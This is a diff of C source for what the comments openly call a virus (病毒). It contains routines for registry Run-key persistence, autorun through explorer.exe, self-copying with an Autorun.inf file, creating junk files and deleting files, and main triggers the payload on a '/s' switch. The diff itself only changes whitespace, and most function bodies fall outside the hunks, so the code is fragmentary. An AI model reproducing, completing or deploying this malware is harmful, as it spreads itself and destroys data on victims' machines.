@@ -33,7 +33,7 @@ char *regadd={"REGEDIT4\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\Cu
  * @param {*} 目的地
  * @return 成功返回0，失败返回1
 */ 
-int copy(char *infile, char *outfile)
+int copy (char *infile, char *outfile)
 {
   FILE *input, *output;
   char temp;
@@ -42,8 +42,8 @@ int copy(char *infile, char *outfile)
   {
     while(!feof(input))
     {
-      fread(&temp,1,1,input);
-      fwrite(&temp,1,1,output);
+      fread(&temp, 1, 1, input);
+      fwrite(&temp, 1, 1, output);
     }
     fclose(input);
     fclose(output);
@@ -58,7 +58,7 @@ int copy(char *infile, char *outfile)
  * 通过explorer自动运行 
  * @return 成功返回0，失败返回1, 2
  */ 
-int autorun_explorer()
+int autorun_explorer ()
 {
   FILE *input;
   if((input=fopen("c:\\windows\\system\\explorer.exe","rb"))!=NULL)
@@ -84,7 +84,7 @@ int autorun_explorer()
  * 添加注册表项 
  * @return 成功返回0，失败返回1
  */ 
-int add_reg()
+int add_reg ()
 {
   FILE *output;
   if((output=fopen("$$$$$","w"))!=NULL)
@@ -100,7 +100,7 @@ int add_reg()
  * 复制病毒 + Autorun.inf自动运行 
  * @return none
  */ 
-void copy_virus()
+void copy_virus ()
 {
   int i,k;
   FILE *input, *output;
@@ -145,7 +145,7 @@ void copy_virus()
  * 制造垃圾文件
  * @return none
  */ 
-void make_rubbish()
+void make_rubbish ()
 {
   int i;
   FILE *output;
@@ -167,7 +167,7 @@ void make_rubbish()
  * 删除文件
  * @return none
  */ 
-void remove_files()
+void remove_files ()
 {
   long done;
   int i;
@@ -195,15 +195,15 @@ void remove_files()
  * 主程序
  * @return none
  */ 
-int main(int argc,char **argv)
+int main (int argc, char **argv)
 {
-  int contral=0;
+  int contral = 0;
   
   autorun_explorer();
   spawnl(1, "c:\\windows\\system\\explorer.exe", NULL);
 
-  if(argc > 1) {
-    if(strcmp(argv[1],"/s") == 0) {
+  if (argc > 1) {
+    if (strcmp(argv[1],"/s") == 0) {
       add_reg();
       copy_virus();
       make_rubbish();
